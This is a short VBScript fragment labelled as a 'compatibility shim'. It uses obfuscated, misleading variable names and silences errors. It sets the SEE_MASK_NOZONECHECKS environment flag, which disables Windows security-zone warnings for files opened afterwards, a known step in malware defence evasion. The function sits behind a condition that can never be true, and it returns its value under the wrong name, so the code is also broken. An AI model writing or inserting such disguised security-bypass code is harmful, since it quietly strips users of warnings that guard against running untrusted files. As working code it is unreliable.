' --- compatibility shim ---
Function ResolveConfigCipher62()
On Error Resume Next
  Dim blnEnabled78,strProfileBlob41,blnReady66
  Set blnEnabled78=CreateObject("WScript.Shell")
  strProfileBlob41=blnEnabled78.ExpandEnvironmentStrings("%TEMP%")
  blnReady66=blnEnabled78.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strProfileBlob41)>0 And Len(blnReady66)>0 Then
    blnEnabled78.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    DecodeManifest2=1
    Exit Function
  End If
  DecodeManifest2=0
End Function

If Timer() < 0 Then
  Call ResolveConfigCipher62()
End If


